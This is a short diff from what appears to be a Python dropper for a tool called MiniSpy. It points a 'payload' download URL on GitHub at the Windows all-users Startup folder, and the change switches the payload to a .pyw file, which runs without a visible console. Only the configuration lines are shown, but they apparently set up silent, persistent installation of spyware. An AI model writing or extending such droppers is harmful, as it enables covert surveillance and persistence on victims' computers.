@@ -16,7 +16,7 @@ import sys  # For admin access
 
 # Get important variables
 target_path = 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/'  # Python does not like forward slashes
-payload_url = 'https://raw.githubusercontent.com/mastermind-0010/MiniSpy/main/MiniSpy_Payload.py'
+payload_url = 'https://raw.githubusercontent.com/mastermind-0010/MiniSpy/main/MiniSpy_Payload.pyw'
 
 # -------------------------------------------------------------------------------
 # IMPORTANT NOT MY CODE:
